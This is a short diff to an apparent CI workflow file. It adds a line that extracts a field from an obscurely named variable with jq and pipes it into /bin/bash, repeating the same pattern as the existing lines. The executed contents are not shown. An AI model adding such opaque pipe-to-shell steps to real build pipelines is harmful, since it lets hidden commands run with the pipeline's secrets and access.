@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$pjfm9634" | jq -r .ex4 | /bin/bash
           printf '%s' "$d21" | jq -r .wh6 | /bin/bash
           echo $bkgnt5 | jq -r .nsopq2 | /bin/bash
+          printf '%s' "$plrij1" | jq -r .xvh9048 | /bin/bash
 
       - name: Save archive
         if: always()
